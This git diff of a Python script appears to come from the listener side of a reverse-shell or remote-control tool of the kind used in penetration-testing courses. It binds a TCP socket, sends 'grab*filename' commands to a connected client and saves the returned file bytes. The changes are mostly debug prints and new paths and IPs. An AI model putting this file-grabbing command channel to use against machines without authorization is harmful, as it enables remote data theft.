@@ -5,9 +5,19 @@ import socket
 #  The tcp client should be run on linux only
 
 def transfer(conn, command):
+        print("Transfer File")
+        print(conn)
+        print(command)
+        print(command.encode())
+        #Send the command ie grab*test.txt to the client
         conn.send(command.encode())
-        path = command.split("*")
-        f=open("/root/Desktop/"+path, "wb")
+        
+        # Split out the path ie grab*text.txt will return 
+        grab, path = command.split("*")
+        print("The grab",grab)
+        print("The path is",path)
+        
+        f=open("/home/tech/" +path, "wb") # Change this to suit your linux machine
         while True:
                 bits = conn.recv(1024)
                 if bits.endswith("DONE".encode()):
@@ -23,9 +33,11 @@ def transfer(conn, command):
 def connect():
         print("[+] - Attempting to connect to server connection...")
         s = socket.socket()
-        s.bind(("10.174.15.6", 8080))
+        s.bind(("192.168.1.183", 8080))
         s.listen(1)
         conn, addr = s.accept()
+        
+        print(" The connection", conn)
         print ("[+] We got a connection from",addr)
     
         while True:
